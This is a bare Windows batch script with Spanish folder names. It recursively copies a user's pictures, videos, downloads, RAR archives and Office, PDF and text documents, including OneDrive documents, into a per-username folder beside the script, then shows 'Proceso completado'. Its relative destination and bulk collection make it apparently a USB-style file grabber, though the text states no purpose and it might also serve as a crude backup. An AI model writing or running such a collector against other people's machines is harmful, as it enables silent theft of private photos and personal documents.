@echo off

IF NOT EXIST .\Archivos\"%USERNAME%" MD .\Archivos\"%USERNAME%"

cd .\Archivos\"%USERNAME%"

for /R %USERPROFILE%\Pictures\ %%x in (*.rar, *.jpg, *.png, *.MP4) do copy "%%x" ".\"
for /R %USERPROFILE%\Downloads\ %%x in (*.rar,*.jpg, *.png, *.MP4) do copy "%%x" ".\"
for /R %USERPROFILE%\Videos\ %%x in (*.jpg, *.png, *.MP4) do copy "%%x" ".\"
for /R %USERPROFILE%\Documentos\ %%x in (*.jpg, *.png, *.DOCX, *.PDF, *.TXT, *.xlsx) do copy "%%x" ".\"
if defined ONEDRIVE (
for /R %ONEDRIVE%\Documentos\ %%x in (*.jpg, *.png, *.DOCX, *.PDF, *.TXT, *.xlsx) do copy "%%x" ".\"
)

msg * "Proceso completado"

EXIT  







